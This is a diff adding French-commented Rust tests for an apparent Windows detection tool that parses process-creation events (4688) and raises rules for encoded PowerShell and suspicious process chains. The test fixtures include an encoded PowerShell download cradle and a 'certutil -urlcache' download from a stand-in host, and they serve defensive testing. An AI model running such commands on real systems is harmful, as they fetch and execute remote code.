@@ -538,6 +538,162 @@ fn cha_001_positif() {
     assert_eq!(arbre.alertes(&chaines).len(), 1);
 }
 
+// ------------------------------------------------------------ couverture ATT&CK, lot 1 : règles de processus sur les 4688
+
+/// Événement 4688 tel que le rend le journal Sécurité (champs utiles seulement)
+fn xml_4688(pid: &str, image: &str, ligne: Option<&str>, ppid: &str, parent: Option<&str>) -> String {
+    let mut x = format!("<Event><System><EventID>4688</EventID></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-1-2-3-1001</Data>\
+        <Data Name='NewProcessId'>{pid}</Data><Data Name='NewProcessName'>{image}</Data><Data Name='ProcessId'>{ppid}</Data>");
+    if let Some(l) = ligne {
+        x += &format!("<Data Name='CommandLine'>{l}</Data>");
+    }
+    if let Some(p) = parent {
+        x += &format!("<Data Name='ParentProcessName'>{p}</Data>");
+    }
+    x + "</EventData></Event>"
+}
+
+#[test]
+fn attack_lot1_4688_parseur() {
+    use crate::processus::{lire_4688, pid_4688, LIGNE_MAX};
+    let d = crate::evenements::donnees(&xml_4688("0x1a2c", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        Some("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"), "0x3e8", Some(r"C:\Windows\System32\cmd.exe")));
+    let c = lire_4688(&d).expect("4688 complet");
+    assert_eq!((c.pid, c.ppid), (0x1a2c, Some(1000)));
+    assert!(c.image.ends_with("powershell.exe") && c.ligne_commande.as_deref().unwrap().starts_with("powershell -enc"));
+    assert_eq!(c.parent_image.as_deref(), Some(r"C:\Windows\System32\cmd.exe"));
+    // PID : hexadécimal préfixé seulement ; sans préfixe, vide, nul, signe, trop long ou non hexadécimal : refusé
+    assert_eq!(pid_4688(" 0X10 "), Some(16));
+    for v in ["1234", "0x", "0x0", "0x+1", "0x-1", "0x123456789", "0xzz", "", "  "] {
+        assert_eq!(pid_4688(v), None, "{v:?}");
+    }
+    // Champs absents : sans PID ou sans programme, rien ; ligne de commande ou parent absents ou vides : None
+    assert!(lire_4688(&crate::evenements::donnees(&xml_4688("1234", r"C:\a.exe", None, "0x4", None))).is_none());
+    assert!(lire_4688(&crate::evenements::donnees(&xml_4688("0x10", "  ", None, "0x4", None))).is_none());
+    let c = lire_4688(&crate::evenements::donnees(&xml_4688("0x10", r"C:\a.exe", Some("   "), "zz", None))).unwrap();
+    assert_eq!((c.ligne_commande, c.ppid, c.parent_image), (None, None, None));
+    // Ligne de commande très longue : bornée
+    let longue = "a".repeat(LIGNE_MAX + 5000);
+    let c = lire_4688(&crate::evenements::donnees(&xml_4688("0x10", r"C:\a.exe", Some(&longue), "0x4", None))).unwrap();
+    assert_eq!(c.ligne_commande.unwrap().chars().count(), LIGNE_MAX);
+    // Mini-fuzz : aucun texte reçu ne fait paniquer le parseur
+    let valide = xml_4688("0x1a2c", r"C:\x\powershell.exe", Some("powershell -c 1"), "0x3e8", Some(r"C:\x\cmd.exe"));
+    crate::tests::torturer_texte(&valide, &mut |t| {
+        let _ = lire_4688(&crate::evenements::donnees(t));
+    });
+}
+
+#[test]
+fn attack_lot1_source_des_regles_de_processus() {
+    use crate::collectes::Note;
+    use crate::processus::{audit_analyse, note_audit};
+    // Sans Sysmon : l'audit analyse s'il est actif ou partiel, sinon WMI
+    assert!(audit_analyse(Note::Active as u8) && audit_analyse(Note::Partielle as u8));
+    for n in [Note::Inconnue, Note::Indisponible, Note::Desactivee] {
+        assert!(!audit_analyse(n as u8), "{n:?}");
+    }
+    let geree = || Some("Poste géré par domaine Active Directory : la baseline est en lecture seule".to_string());
+    let libre = || None;
+    // État de la collecte : jamais « rien de suspect » quand l'audit manque, repli sur WMI toujours dit
+    assert_eq!(note_audit(true, Some(3), true, (5, 0), false, &libre), (Note::Active, String::new()));
+    let (n, r) = note_audit(false, Some(1), true, (0, 0), true, &libre);
+    assert!(n == Note::Indisponible && r.contains("journal Sécurité illisible") && r.contains("WMI"), "{r}");
+    let (n, r) = note_audit(true, None, true, (0, 0), false, &libre);
+    assert!(n == Note::Indisponible && r.contains("illisible"), "{r}");
+    let (n, r) = note_audit(true, Some(2), true, (0, 0), false, &libre);
+    assert!(n == Note::Desactivee && r.contains("non activé") && r.contains("WMI"), "audit jamais activé : {r}");
+    let (n, r) = note_audit(true, Some(0), true, (0, 0), true, &libre);
+    assert!(n == Note::Indisponible && r.contains("coupé"), "audit coupé après avoir été actif : {r}");
+    let (n, r) = note_audit(true, Some(0), true, (0, 0), false, &geree);
+    assert!(n == Note::Desactivee && r.contains("WMI") && r.contains("lecture seule"), "poste géré : repli dit : {r}");
+    let (n, r) = note_audit(true, Some(1), false, (3, 0), false, &libre);
+    assert!(n == Note::Partielle && r.contains("ligne de commande absente"), "réglage de la ligne de commande coupé : {r}");
+    let (n, _) = note_audit(true, Some(1), true, (0, 4), false, &libre);
+    assert_eq!(n, Note::Partielle, "4688 vus sans ligne de commande");
+    assert_eq!(note_audit(true, Some(1), true, (0, 0), false, &libre).0, Note::Active, "aucun 4688 vu : rien n'indique un manque");
+    // Couverture publiée : audit actif, PRC-002 n'est plus dégradée ; audit absent, WMI partiel : dégradée
+    use crate::collectes::{besoins, couverture, Collecte, Couverture, EtatPublie};
+    let etat = |audit: EtatPublie| move |c| match c {
+        Collecte::AuditProcessus => audit.clone(),
+        Collecte::WmiProcessus => EtatPublie::Partielle("p".into()),
+        _ => EtatPublie::Desactivee("d".into()),
+    };
+    assert_eq!(couverture(besoins("PRC-002"), &etat(EtatPublie::Active)), Couverture::Assuree);
+    assert_eq!(couverture(besoins("PRC-002"), &etat(EtatPublie::Desactivee("n".into()))), Couverture::Degradee);
+}
+
+#[test]
+fn attack_lot1_processus_termine_detecte_par_son_4688() {
+    use crate::collectes::Note;
+    use crate::processus::Processus;
+    // Le défaut corrigé : sans Sysmon, un PowerShell bref était déjà terminé quand WMI l'interrogeait. Le 4688 porte
+    // tout (programme, ligne de commande, parent) : PRC-002 se lève sans que le processus vive encore
+    let p = Processus::nouveau();
+    p.regler_audit_test(Note::Active);
+    let x = xml_4688("0xfffff0", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        Some("powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"),
+        "0xfffff4", Some(r"C:\Windows\System32\cmd.exe"));
+    p.traiter_4688(&x);
+    let a = std::mem::take(&mut *p.detections.lock().unwrap());
+    assert_eq!(a.iter().map(|a| a.regle.as_str()).collect::<Vec<_>>(), ["PRC-002"]);
+    assert_eq!(a[0].parent, r"C:\Windows\System32\cmd.exe");
+    assert_eq!(p.creations.lock().unwrap().len(), 1, "création transmise à l'arbre des chaînes");
+    assert_eq!(p.source_publiee(), "Audit 4688");
+    // Même création relue (passage d'une source à l'autre) : une seule alerte
+    p.traiter_4688(&x);
+    assert!(p.detections.lock().unwrap().is_empty(), "une seule alerte par création");
+    // Témoin négatif : PowerShell ordinaire, aucune alerte
+    p.traiter_4688(&xml_4688("0xfffff8", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", Some("powershell.exe -NoProfile -File C:\\scripts\\sauvegarde.ps1"), "0xfffff4", None));
+    assert!(p.detections.lock().unwrap().is_empty(), "PowerShell ordinaire");
+    // Audit non retenu (WMI analyse) : le 4688 ne fait que nourrir l'arbre, aucune alerte en double
+    let q = Processus::nouveau();
+    q.regler_audit_test(Note::Desactivee);
+    q.traiter_4688(&x);
+    assert!(q.detections.lock().unwrap().is_empty());
+    assert_eq!(q.creations.lock().unwrap().len(), 1);
+}
+
+#[test]
+fn attack_lot1_une_alerte_par_creation_et_cache_wmi() {
+    use crate::processus::{deja_signale, info_depuis_4688, Creation4688, InfoProcessus};
+    use std::time::{Duration, Instant};
+    let mut vus = std::collections::HashMap::new();
+    let t = Instant::now();
+    assert!(!deja_signale(&mut vus, 50, r"C:\x\PowerShell.exe", t));
+    assert!(deja_signale(&mut vus, 50, "powershell.exe", t + Duration::from_secs(5)), "même PID, même programme (chemin WMI ou 4688)");
+    assert!(!deja_signale(&mut vus, 50, r"C:\x\cmd.exe", t + Duration::from_secs(6)), "PID réutilisé par un autre programme");
+    assert!(!deja_signale(&mut vus, 51, r"C:\x\cmd.exe", t + Duration::from_secs(700)), "après 10 min");
+    // Ligne de commande absente du 4688 : reprise du cache WMI du même programme, jamais d'un autre
+    let c = Creation4688 { pid: 9, image: r"C:\W\powershell.exe".into(), ligne_commande: None, ppid: Some(8), parent_image: None };
+    let wmi = InfoProcessus::pour_test(r"C:\W\powershell.exe", Some("powershell -enc AAAA"), Some(r"C:\W\cmd.exe"));
+    let i = info_depuis_4688(&c, Some(&wmi));
+    assert_eq!((i.ligne_commande.as_deref(), i.parent_chemin.as_deref()), (Some("powershell -enc AAAA"), Some(r"C:\W\cmd.exe")));
+    let autre = InfoProcessus::pour_test(r"C:\W\notepad.exe", Some("notepad x"), None);
+    assert_eq!(info_depuis_4688(&c, Some(&autre)).ligne_commande, None);
+}
+
+#[test]
+fn attack_lot1_cha_001_processus_bref_garde_son_parent() {
+    // Un enfant bref de cmd (PID 600), déjà terminé à la lecture de la liste : sans sa création (4688), il n'a pas de
+    // parent dans l'arbre et ses signaux ne s'ajoutent pas à ceux de cmd ; avec elle, la chaîne atteint le seuil
+    let mut sans = arbre_de_test();
+    sans.signaler(200, 5, "PowerShell obscurci ou qui télécharge du code");
+    sans.signaler(600, 7, "détournement d'outil Windows (LOLBin)");
+    assert!(sans.alertes(&sans.chaines()).is_empty(), "sans la création, aucune chaîne");
+    let mut arbre = arbre_de_test();
+    arbre.creation(600, Some(200), r"C:\Windows\System32\certutil.exe", Some("certutil -urlcache -f http://x/y z"));
+    arbre.signaler(200, 5, "PowerShell obscurci ou qui télécharge du code");
+    arbre.signaler(600, 7, "détournement d'outil Windows (LOLBin)");
+    let a = arbre.alertes(&arbre.chaines());
+    assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.score)).collect::<Vec<_>>(), [("CHA-001", 12)]);
+    // La liste suivante (sans l'enfant terminé) ne l'efface pas ; un PID réutilisé par un autre programme le remplace
+    let mut liste: std::collections::HashMap<u32, crate::natif::InfoListe> = std::collections::HashMap::new();
+    liste.insert(200, crate::natif::InfoListe { nom: "cmd".into(), parent: 100 });
+    arbre.maj(&liste);
+    arbre.creation(600, Some(500), r"C:\Windows\notepad.exe", None);
+    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "PID réutilisé : signaux de l'ancien programme effacés");
+}
+
 #[test]
 fn cha_001_negatif() {
     // Un seul signal fort (14) : pas une chaîne ; deux signaux sous le seuil (11) : rien
